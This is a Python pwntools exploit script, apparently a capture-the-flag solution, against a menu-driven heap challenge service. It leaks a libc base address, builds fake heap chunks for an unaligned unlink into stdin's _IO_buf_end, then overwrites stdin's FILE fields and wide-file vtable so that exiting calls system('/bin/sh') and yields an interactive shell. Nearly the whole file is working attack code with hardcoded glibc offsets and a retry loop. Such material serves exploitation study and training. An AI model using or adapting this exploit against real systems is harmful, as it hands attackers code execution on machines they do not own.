#!/usr/bin/env python2
from pwn import *
from sys import argv
import time

NUM_TRIES = 0x8

""" To keep the exploit execution easy, don't use libc here
libc = ELF("libc.so.6")
OFFSET_main_arena = libc.symbols['main_arena']
OFFSET__IO_2_1_stdin_ = libc.symbols['_IO_2_1_stdin_']
OFFSET_system = libc.symbols["system"]
OFFSET___GI__IO_wfile_jumps = libc.symbols['__GI__IO_wfile_jumps']
"""

OFFSET_main_arena = 0x1beaa0
OFFSET__IO_2_1_stdin_ = 0x1be860
OFFSET_system = 0x45380
OFFSET___GI__IO_wfile_jumps = 0x1babc0

MENU_START = "Please select your action:\n"
MENU_END = "exit\n"

MMAP_Q = "Allocating your scratch pad. Location (default "

LEAK_Q = "At which offset do you want to leak?\n"
FREE_Q = "At which offset do you want to free?\n"
WRITE_Q_NUM = "How much do you want to write?\n"
WRITE_Q_OFF = "At which offset?\n"

OPT_WRITE = 1
OPT_FREE = 2
OPT_LEAK = 3
OPT_EXIT = 4

local = len(argv)==1
if local:
    HOST = "arch"
    PORT = 4444
else:
    assert(len(argv)==3)
    HOST = argv[1]
    PORT = int(argv[2])

MMAPED_SIZE = 0x10000

#context.log_level="debug"
context.update(bits=64)

def menu():
    r.recvuntil(MENU_END)


def leak(offset):
    assert(0 <= offset <= MMAPED_SIZE-8)
    menu()
    r.sendline("{:d}".format(OPT_LEAK))
    r.sendlineafter(LEAK_Q, "{:d}".format(offset))
    return r.recvuntil(MENU_START, drop=True)[:-1]


def write(offset, content):
    assert(0 <= offset <= MMAPED_SIZE-len(content))

    menu()
    r.sendline("{:d}".format(OPT_WRITE))
    r.sendlineafter(WRITE_Q_NUM, "{:d}".format(len(content)))
    r.sendlineafter(WRITE_Q_OFF, "{:d}".format(offset))
    r.send(content)
    r.recvuntil(MENU_START)


def free(offset):
    menu()
    r.sendline("{:d}".format(OPT_FREE))
    r.sendlineafter(FREE_Q, "{:d}".format(offset))
    r.recvuntil(MENU_START)


def bye():
    menu()
    r.sendline("{:d}".format(OPT_EXIT))


def fill_chunk(offset, prev_size=None, size=None, fd=None, bk=None):
    assert(0<=offset<=MMAPED_SIZE-0x20)

    # We split it here to be able to just fill in the missing parts
    if prev_size is not None:
        write(offset, p64(prev_size))
    if size is not None:
        write(offset+8, p64(size))
    if fd is not None:
        write(offset+16, p64(fd))
    if bk is not None:
        write(offset+24, p64(bk))


def make_chunk(offset, prev_size=0, size=0, fd=0, bk=0, next_size=None):
    assert(0<=offset<=MMAPED_SIZE-0x20)

    # Here we just create it in one go to save round trips
    write(offset, flat(prev_size, size, fd, bk))

    if next_size is not None:
        next_chunk_offset = offset+(size&(~7))
        # Set next->prev_inuse
        write(next_chunk_offset+8, p64(next_size|1))
        # Set next->next->prev_inuse
        write(next_chunk_offset+next_size+8, p64(1))

mmapped_base = 0x7f0000


i = 0

while(i < NUM_TRIES):
    try:
        time.sleep(0.1)
        with remote(HOST, PORT) as r:

            r.recvuntil(MMAP_Q)
            r.send("{:d}\n".format(mmapped_base))

            BASE_SIZE = 0x100
            BASE_OFF = MMAPED_SIZE-16*BASE_SIZE
            make_chunk(BASE_OFF, 0, BASE_SIZE, 0, 0)
            make_chunk(BASE_OFF+0x20, 0, BASE_SIZE)

            #raw_input("free...")
            # Fill TCACHE[5]
            for i in range(3):
                free(BASE_OFF+0x10)
                free(BASE_OFF+0x20+0x10)

            free(BASE_OFF+0x10)

            """ Plan:
            1. Leak libc base and assert alignment of libc base at 0x00007fXXX0XXXXXX
            2. For the trigger, also set up before
                2.1 stdin->_codecvt target in mmapped region
                    fit({0: "/bin/sh\0", 0x18: libc.symbols["system"]})
                2.2 stdin->_wide_data target in mmapped region
                    7*p64(mmapped_base)+p64(mmapped_base+1)
            3. Perform unaligned unlink against stdin
                3.1 Free fake controlled chunk which backward consolidation
                3.2 prev(fake)
                    3.2.1 prev(fake)->fd points to &stdin->_IO_buf_end (off 64)+3-0x18
                    3.2.2 prev(fake)->bk points to chunk in mapped base with high LSB
                        prev(fake)->bk->fd points back to prev(fake)
                        prev(fake)->bk LSB has to be high to inject a high address into stdin.->_IO_buf_end upon unlinking
            4. Trigger overflow
                # 5 bytes padding, then entries starting at &stdin->_lock
                5*"A"+fit({
                    0x00: mmapped_base+MMAPED_SIZE-1,      # _lock
                    0x08: 0xffffffffffffffff,              # _offset
                    0x10: codecvt,                         # _codecvt
                    0x18: wide_data,                       # _wide_data
                    0x50: libc.syms['__GI__IO_wfile_jumps']
                }, filler="\x00")
            5. Exit, triggering function pointer
            """

            #raw_input("make second chunk...")
            make_chunk(BASE_OFF, 0, BASE_SIZE|1, 0, 0, 0x20)
            free(BASE_OFF+0x10)

            #write(0, p64(mmapped_base+BASE_OFF+0x10))

            s = ""
            while len(s)!=7:
                l = leak(BASE_OFF+0x10+len(s))
                s += (l+"\0")

            #libc_addr = u64(("\0"+s[1:]).ljust(8, "\0"))
            libc_addr = u64(s.ljust(8, "\0"))
            libc_base = libc_addr-OFFSET_main_arena-96

            print("Got libc addr: {:016x}, libc base: 0x{:016x}".format(libc_addr, libc_base))

            if libc_addr&0x000000000f000000!=0: #skip for the moment
                print("Wrong alignment...")
                bye()
                continue
            else:
                print("Got good alignment. Go!")
                i+=1

            # First clear section
            # write(0, 0x1000*"\0")

            # Now establish offsets based on 3.
            # The chunk itself
            FAKE_SIZE = BASE_SIZE
            PREV_SIZE = 0x20
            NEXT_SIZE = 0x20
            fake_chunk_off = ((libc_addr>>24)&0xfff0) + PREV_SIZE

            # The unaligned target in libc
            # libc.address = libc_base
            stdin__IO_buf_end = libc_base+OFFSET__IO_2_1_stdin_+64
            unaligned_tar = stdin__IO_buf_end+3

            # The offsets of prev(chunk)->bk and fake stdin->_wide_data, stdin->_codecvt
            fake_bk_off = 0xffe0
            wide_data_off = 0xfc00

            # Take care about the situation where our fake structs could collide with our fake chunk
            if fake_chunk_off & 0xff00 == 0xff:
            #    fake_bk_off -= 0x1000
                wide_data_off -= 0x1000

            codecvt_off = wide_data_off+0x80

            # Calculate actual addresses that we need later
            fake_chunk = mmapped_base+fake_chunk_off
            fake_bk = mmapped_base+fake_bk_off
            codecvt = mmapped_base+codecvt_off
            wide_data = mmapped_base+wide_data_off

            # Set up fake chunk
            make_chunk(fake_chunk_off, PREV_SIZE, FAKE_SIZE, 0, 0, NEXT_SIZE)
            make_chunk(fake_chunk_off-PREV_SIZE, 0, PREV_SIZE|1, unaligned_tar-0x18, fake_bk)
            write(fake_bk_off+0x10, p64(fake_chunk-PREV_SIZE))

            # Write fake data structures
            codecvt_pl = fit({0: "/bin/sh\0", 0x18: libc_base+OFFSET_system})
            wide_data_pl = 7*p64(mmapped_base)+p64(mmapped_base+0x100)
            write(codecvt_off, codecvt_pl)
            write(wide_data_off, wide_data_pl)

            #raw_input("free...")
            free(fake_chunk_off+0x10)

            #raw_input("overflow into stdin struct...")
            overflow_pl = 5*"A"+fit({ # 5 bytes padding, then entries starting at &stdin->_lock
                    0x00: mmapped_base+MMAPED_SIZE-24,     # _lock
                    0x08: 0xffffffffffffffff,              # _offset
                    0x10: codecvt,                         # _codecvt
                    0x18: wide_data,                       # _wide_data
                    0x50: libc_base+OFFSET___GI__IO_wfile_jumps
                }, filler="\x00")
            write(0, overflow_pl)

            menu()
            r.sendline()
            r.clean(timeout=3)
            #r.sendline("id")
            
            #if "uid" in r.recv(4096):
            #    print("Success")
            #    exit(0)
            r.interactive()

    except EOFError:
        pass
    except PwnlibException:
        pass

log.warn("Could not get a shell...")
exit(-1)
